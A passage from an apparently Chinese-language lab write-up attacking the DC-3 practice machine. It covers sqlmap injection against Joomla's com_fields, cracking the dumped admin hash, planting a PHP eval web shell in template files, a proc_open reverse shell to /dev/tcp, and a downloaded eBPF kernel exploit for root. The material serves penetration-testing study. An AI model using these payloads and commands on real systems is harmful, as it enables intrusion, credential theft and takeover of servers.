class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><ul><li>CSS攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/43488.txt  <br></code></pre></td></tr></table></figure><blockquote><p>CSS攻击是一种利用浏览器对CSS的解析和应用来实施的安全攻击。通过利用浏览器在渲染网页时对CSS的强大控制能力，通过构造恶意的CSS代码来实现攻击的目的。常见的CSS攻击方式有：CSS注入攻击、CSS选择器攻击、CSS历史攻击、针对特定浏览器漏洞的攻击等等。</p></blockquote><p>有关于该漏洞利用的概要介绍为:</p><blockquote><ol><li>Description（描述）</li></ol><p>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed in the user’s browser. Works with every version up to 4.0.20</p><p>无论何时用户在正文中使用&lt;\textarea&gt;编辑信息时，&lt;\textarea&gt;时候的任意内容都会在用户的浏览器中被执行。这一特性适用于4.0.20之前的版本。</p><ol start="2"><li>Proof of Concept（概念验证）</li></ol><p>Login with permissions to post a message, insert &lt;\textarea&gt; in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed</p><p>获取相应权限登陆以发布信息，在主体中插入 &lt;\textarea&gt; 并在它后面添加任意html代码，无论何时用户尝试去编辑这些信息，那些被写在 &lt;\textarea&gt; 后面的代码都会被执行。</p><ol start="3"><li>Solution:（解决方案）</li></ol><p>Update to version 4.0.21<br><a href="https://stackideas.com/blog/easydiscuss4021-update">https://stackideas.com/blog/easydiscuss4021-update</a></p><p>将版本更新到4.0.21</p></blockquote><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>意思意思吧，万一有比SQL注入更简便的方法呢？或许直接有用户的数据库呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702200337335.png" alt="image-20240702200337335"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202047792.png" alt="image-20240702202047792"></p><p>可以看到，有关于Joomla的漏洞还挺多！</p><p>在前面的nmap漏扫，以及上面的searchsploit（附带版本号）的查询结果，都提到了SQL注入。</p><p>在上述msfconsole的搜索结果中，在rank等级为<code>excellent</code>，又比较新的漏洞中查找有关于SQL注入的漏洞，并尝试利用它：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202404808.png" alt="image-20240702202404808"></p><p>好！6号漏洞<code>exploit/unix/webapp/joomla_comfields_sqli_rce </code>申请出战！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/joomla_comfields_sqli_rce<br><br>show options<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.132<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202620785.png" alt="image-20240702202620785"></p><p>执行<code>run/exploit</code>:<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202723977.png" alt="image-20240702202723977"></p><p>发现均没有 session 被创建，即利用失败！对<code>msfconsole</code>搜索出来的漏洞利用失败，所以我们还是得回去尝试通过<code>searchsploit</code>搜索得到的可利用代码文件以及利用方法了。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>根据上一节<code>searchsploit</code>搜索得到的信息对目标靶机进行sqlmap注入测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>--dbs</code>：指示 sqlmap 列出目标数据库服务器中的所有数据库</p><p>注入结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702203426962.png" alt="image-20240702203426962"></p><p>失败了。。。。。？？？？</p><p>哦！注意！利用文件中给出的利用方法中，给出的URL中的<code>localhost</code>字段需要自己手动修改成目标靶机的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702204349894.png" alt="image-20240702204349894"></p><p>得到的信息有：</p><blockquote><p>可用的数据库有：</p><p>information_schema<br><strong>joomladb</strong>    <strong>！！！！</strong><br>mysql<br>performance_schema<br>sys</p></blockquote><p>对其中最可能含有有价值信息的joomladb数据库进行进一步的访问，指定列出joomladb数据库的所有表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明目标URL</p><p><code>-D</code>：指定目标数据库的名称</p><p><code>--riks</code>：设置SQL注入的风险级别，数字越高表示尝试更高风险的注入测试。</p><p><code>--level</code>：设置测试的深度级别，数字越高表示尝试更深入的注入测试。</p><p><code>--random-agent</code>该参数使得每次请求都使用一个随机的User-Agent头部，这有助于隐藏 sqlmap 的请求特征，增加匿名性。</p><p><code>--tables</code>：参数指示sqlmap列出目标数据库中的所有表名。</p><p><code>-P list[fullordering]</code>：-p参数指定了用于注入的URL参数名：list[fullordering]这是一个潜在的注入点，sqlmap将尝试利用这个参数进行SQL注入测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235531424.png" alt="image-20240702235531424"></p><p>一共有76张表table呢！在其中发现了一个名为<code>users</code>的表，尝试访问。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235648824.png" alt="image-20240702235648824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-T</code>：用于指定目标数据库中的表名。因为数据库名是<code>#__users</code>，但是<code>#</code>在数据库中又表示注释符号，所以需要给给这个字段添加一对双引号，以防止错误解析。</p><p><code>--columns</code>：该参数指示sqlmap列出指定表的所有列。</p><p>在实际的命令运行过程中，会发生有三个需要输入选项的地方，前两个选<code>y</code>之后那个需要选择字典wordlist的地方就什么都不选直接 回车等待结果就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150454303.png" alt="image-20240703150454303"></p><p>得到<code>joomladb数据库</code>的表为<code> #__users</code>的<code>列</code>相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150540777.png" alt="image-20240703150540777"></p><p>可以发现其中有名为<code> name 、password、 username</code>的账户信息列。因而我们需要进一步查看这些列的具体信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> -C name,username,password --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-C </code>：指定要查询的列名，多个列名之间使用逗号进行分隔。</p><p><code>--dump</code>该参数指示sqlmap将从数据库中检索到的数据打印出来。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703151043560.png" alt="image-20240703151043560"></p><p>不难想到这是一个管理员的账号，但是密码显然是经过hash加密后的。因此接下来就是要对这个密码进行碰撞破解或是进行重置，将其修改为自己的密码。</p><blockquote><p>name:admin</p><p>username：admin</p><p>password：</p><p>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p></blockquote><ul><li>重置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152729545.png" alt="image-20240703152729545"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152857235.png" alt="image-20240703152857235"></p><blockquote><p>.so文件是linux系统中的动态链接库文件，它们通过动态链接的方式在运行时被程序加载。</p></blockquote><p>看了有关于带有<code>hash</code>字样文件的搜索结果，发现其中并没有关于password-hash的加密脚本文件。虽然有几个像的，但是也没有明确显示出就是hash密码加密脚本文件。所以重置密码这个思路可以暂时搁置了。</p><ul><li>碰撞爆破</li></ul><p>使用<code>john</code>工具来实现hash值的碰撞爆破。（kali自带有john）</p><p>首先先将上述获得的管理员密码的hash值保存为<code>user_password_hash.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> user_password_hash.txt<br><br>vim user_password_hash.txt<br><br><span class="hljs-built_in">cat</span> user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154132239.png" alt="image-20240703154132239"></p><p>然后使用john命令进行碰撞爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154228849.png" alt="image-20240703154228849"></p><p>中间标黄的就是碰撞爆破得到的密码：<code>snoopy </code></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>ok！尝试去登陆后台管理系统<code>http://192.168.204.132/administrator/</code>！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154538725.png" alt="image-20240703154538725"></p><p>成功！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>到处看看管理系统，发现在Extensions下的Templates（模板）有Templates模板块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154807462.png" alt="image-20240703154807462"></p><p>进入该模板块，发现其中一共有两个模板：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154823270.png" alt="image-20240703154823270"></p><p>点进第一个模板，在左侧目录栏进入<code>index.php</code>文件（正常情况下优先考虑的文件）。</p><blockquote><p>有了PHP文件，就可以考虑各种拿shell的方法，包括但不限于一句话木马。</p><ul><li>一句话木马</li></ul><?php @eval($_POST['shell']);?><p>以 <?php 和 ;?> 分别为开头和结尾，然后使用 @ 符号抑制错误输出，后面接着跟着 一个函数名 用于 执行字符串 作为php代码运行。接着跟一个括号，括号内首先跟一个超全局数组 $_POST ，这里表示获取通过POST方法传递的参数，后面接着一个中括号，括号内为向POST传递的一个（命令）字符串，该（命令）字符串将会被前面的函数执行，就是相当于执行某个命令嘛！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703160840412.png" alt="image-20240703160840412"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703162717989.png" alt="image-20240703162717989"></p><p>在此处设置放入一句话木马🐎（放在最开始吧）：</p><p>注意！这里去头去尾了哦！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703232034778.png" alt="image-20240703232034778"></p><p>点击左上角的“save &amp; close”对文件进行保存。</p><p>对第二个模板进行相同的一句话木马注入操作，以防止上面所注入一句话木马的模板并不是目标靶机后台管理系统所使用的模板，进而导致失败瓶颈。</p><p>然后通过中国蚁剑进行连接。</p><blockquote><p>kali安装中国蚁剑的教程为：</p><p><a href="https://blog.csdn.net/liver100day/article/details/120222378%EF%BC%88kali%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91%EF%BC%89">https://blog.csdn.net/liver100day/article/details/120222378（kali如何安装蚁剑）</a></p></blockquote><p>安装完kali之后，若想在本地物理主机远程连接以及打开中国蚁剑，那么需要启用X11转发选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -X sweet@192.168.204.128<br></code></pre></td></tr></table></figure><p>连接成功后进入到中国蚁剑文件夹中，执行<code>./AntSword</code>命令：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211405701.png" alt="image-20240703211405701"></p><p>发现在本地物理主机上启动失败。粗错误信息表示应用程序在试图连接到X服务器的显示屏，但无法打开显示。根据gpt问答，可知需要启用X11转发选项，但是我已经启用了，还是没能成功显示。</p><p>当然也有可能是DISPLAY环境变量没正确设置，但是再次尝试有点花费时间和力气。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211719844.png" alt="image-20240703211719844"></p><p>去kali虚拟机上尝试启用中国蚁剑（在kali已经成功安装的基础上）。成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211900066.png" alt="image-20240703211900066"></p><p>右键空白处选择“ADD”添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213434075.png" alt="image-20240703213434075"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213808540.png" alt="image-20240703213808540"></p><p><code>Shell url</code>:目标靶机的URL地址。</p><p><code>Shell pwd</code>：连接密码，代码参数值，例如 &lt;?php @eval($_POST[‘x’])?;&gt;中的“X”值。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213828518.png" alt="image-20240703213828518"></p><p>选中所添加的连接，右键选择第一项<code>Ternimal</code>打开终端。如果能正确连接上目标靶机URL的话就会显示如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234428385.png" alt="image-20240703234428385"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>中国蚁剑连接上目标URL之后，模拟的是正常用户访问该URL，只要访问该URL，网页代码就会被启动，一句话木马就会被触发。我们注入的一句话木马要执行的命令是<code>shell</code>提权命令。所以使用上述检测命令检测当前所获得的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234524751.png" alt="image-20240703234524751"></p><p>根据结果可以发现，尽管已经拿到了shell，但是目前所拥有的权限还不是root权限。因此，还需要进行进一步的提权操作。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linux提权总结：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>编写通过prop_open反弹shell的php代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。<br>&lt;?php<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;  // 攻击者的IP地址<br><span class="hljs-variable">$port</span> = 9999;          // 攻击者的端口号<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>    0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   // stdin 是一个管道，子进程从中读取数据<br>    1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   // stdout 是一个管道，子进程向其中写入数据<br>    2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    // stderr 是一个管道，子进程向其中写入数据<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>    fclose(<span class="hljs-variable">$pipes</span>[0]);  // 关闭stdin<br>    fclose(<span class="hljs-variable">$pipes</span>[1]);  // 关闭stdout<br>    fclose(<span class="hljs-variable">$pipes</span>[2]);  // 关闭stderr<br><br>    proc_close(<span class="hljs-variable">$process</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>将这段php代码（掐头去尾）分别加入到两个模板文件中的index.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004311523.png" alt="image-20240704004311523"></p><p>在终端监听设置的端口 <code>9999</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>：netstat，用于监听指定端口，可用于读取或写入网络连接的数据。</p><p><code>-l</code>：监听模式，指示其在指定的端口上监听连接请求。</p><p><code>-v</code>：详细模式</p><p><code>-vv</code>：更详细的详细模式</p><p><code>-p</code>：指定监听的端口号</p><p>然后访问目标网页URL<code>http://192.168.204.132/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004700989.png" alt="image-20240704004700989"></p><p>反弹成功，成功获取<code>www-data</code>的权限，伪装成为用户www-data。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005119035.png" alt="image-20240704005119035"></p><h3 id="检索提权命令"><a href="#检索提权命令" class="headerlink" title="检索提权命令"></a>检索提权命令</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br><br>//查看并过滤与模式列表的模式整行匹配的命令<br>compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br></code></pre></td></tr></table></figure><p><code>-E</code>：表示使用扩展正则表达式进行匹配。</p><p><code>-x</code>：只匹配整行，即完全匹配 模式 中的整行内容，例nmap。即不断章取义的意思</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005209848.png" alt="image-20240704005209848"></p><h4 id="查看具有SUID权限的命令"><a href="#查看具有SUID权限的命令" class="headerlink" title="查看具有SUID权限的命令"></a>查看具有SUID权限的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005240879.png" alt="image-20240704005240879"></p><p>可执行的命令和能够提权的命令之间似乎没用交集，也就是已知的可使用的命令都不能够用来提权。</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>通过以下指令查询使用的操作系统信息以及内核相关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a  // 显示系统信息 -a表示可用信息<br><span class="hljs-built_in">cat</span> /etc/issue   //查看系统的简要说明或欢迎信息<br><span class="hljs-built_in">cat</span> /etc/*-release  //查看系统的发行版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005611511.png" alt="image-20240704005611511"></p><p>可以得到的信息是：</p><blockquote><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</p><p>Ubuntu 16.04 LTS（VERSION&#x3D;”16.04 LTS (Xenial Xerus)”）</p></blockquote><p>通过searchsploit查找可利用的漏洞代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704010041749.png" alt="image-20240704010041749"></p><p>搜索结果不少，一般来说，文件后缀名为<code>txt</code>的漏洞利用比较容易实现。可以对搜索得到的漏洞进行逐一尝试（一共有六个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 40937.txt<br>searchsploit -p 40943.txt<br>searchsploit -p 41923.txt<br>searchsploit -p 39773.txt<br>searchsploit -p 39772.txt<br>searchsploit -p 40489.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110327425.png" alt="image-20240704110327425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110814118.png" alt="image-20240704110814118"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40937.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40943.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41923.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;dos&#x2F;39773.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40489.txt</p><p>没有什么有用的提示</p><p>给出了两个利用文件以及文件下载地址</p><p>给出了漏洞概述以及漏洞代码，似乎没有利用方法</p><p>没有什么有用的提示</p><p>给出了漏洞文件的下载地址以及使用方法（√）</p><p>给出了提权方法，但是是利用ipv6的兼容端口复用的，利用方法没给</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114451762.png" alt="image-20240704114451762"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（进入到对应目录）<br>./compile.sh<br>./doubleput<br>（等待提权成功）<br><span class="hljs-built_in">id</span>   // 验证当前用户身份，是否提权成功<br></code></pre></td></tr></table></figure><blockquote><p>Proof of Concept（概念验证）: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</a><br>Exploit-DB Mirror（下载镜像）: <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p></blockquote><p>点击下载镜像之后，跳转到浏览器，自动下载成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114809119.png" alt="image-20240704114809119"></p><p>嗯！怎么可以在本物理机下载漏洞呢！得下在虚拟机啊！记住要以目标靶机合法用户的身份下载！因为后续要进行提权！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p>下载并保存成功了！保存文件名为“39772.zip”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121612377.png" alt="image-20240704121612377"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121708628.png" alt="image-20240704121708628"></p><p>创建了一个名为“39772”的文件夹，进入看看它有什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121729949.png"></p><p>对这两个tar文件进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>**<code>tar</code>**：是 Linux 和类 Unix 系统中用于处理归档文件的命令。</p><p>**<code>-x</code>**：表示执行解压缩操作（extract），即从归档文件中提取文件。</p><p>**<code>-v</code>**：可选参数，表示详细模式（verbose），在解压缩过程中显示详细信息。</p><p>**<code>-f</code>**：指定要操作的归档文件的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123036561.png" alt="image-20240704123036561"></p><p>查看当前目录下的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123117671.png" alt="image-20240704123117671"></p><p>第二第三个文件的前缀是不是和前面获得的漏洞利用方法那儿一致呀！进入exploit利用文件（因为我们要利用漏洞嘛），然后执行提权命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123558257.png" alt="image-20240704123558257"></p><p>根据提示信息，我们现在已经获取了root权限！</p><p>开启交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>验证是否为root权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123736857.png" 